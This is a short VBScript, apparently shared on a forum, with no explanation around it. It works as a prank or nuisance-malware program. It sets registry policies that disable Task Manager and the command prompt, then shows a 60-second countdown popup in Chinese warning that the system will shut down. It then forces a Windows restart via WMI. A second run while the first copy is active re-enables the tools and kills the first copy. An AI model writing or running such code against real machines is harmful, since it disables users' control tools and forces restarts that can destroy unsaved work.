set s=createobject("wscript.shell") 
set bag=getobject("winmgmts:\\.\root\cimv2") 
set pipe=bag.execquery("select * from win32_process where name='wscript.exe'") 
For Each id in pipe 
if instr(1,id.commandLine,wscript.scriptfullname)<>0 and pipe.count>=2 then 
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",0,"REG_DWORD" 
s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",0,"REG_DWORD" 
id.terminate() 
else 
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\DisableTaskMgr",1,"REG_DWORD" 
s.regwrite"HKCU\Software\Policies\Microsoft\Windows\System\DisableCMD",1,"REG_DWORD" 
for i=1 to 60 
s.popup"系统将在"& 60-i &"秒后关机...",1,"系统提示",4096+48 
next 
Set colOS = GetObject("winmgmts:{(Shutdown)}").ExecQuery("Select * FROM Win32_OperatingSystem") 
For Each eOs In colOS 
eOs.Win32Shutdown(2) 
Next 
end if 
Next 
 
[color=#FF0000]